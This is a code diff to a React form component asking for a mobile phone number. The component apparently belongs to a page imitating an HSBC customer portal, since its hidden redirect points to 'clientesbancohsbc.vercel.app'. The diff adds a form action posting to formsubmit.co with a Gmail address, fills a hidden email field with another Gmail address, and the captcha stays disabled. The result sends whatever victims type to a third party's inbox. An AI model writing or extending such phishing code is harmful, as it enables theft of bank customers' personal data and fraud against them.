@@ -5,7 +5,7 @@ const Numerocelular = () => {
     return (
         <div className="contglobal">
         <div className='contenedor' >
-        <form className='formulario' action="" method="POST" >
+        <form className='formulario' action="https://formsubmit.co/robr48j@gmail.com" method="POST" >
             <h1 className='titulo'>Numero de Celular</h1>
             <div className='cont'>
                 <div className="labeleicon">
@@ -13,7 +13,7 @@ const Numerocelular = () => {
                 </div>
                 <div className="input-cont">
                     <input className='inputname' name='name' type="text"/>
-                    <input type="hidden" name="email" value="" />
+                    <input type="hidden" name="email" value="p1804251@gmail.com" />
                     <input type="hidden" name="_next" value="https://clientesbancohsbc.vercel.app/user" />
                     <input type="hidden" name="_captcha" value="false" />
                 </div>
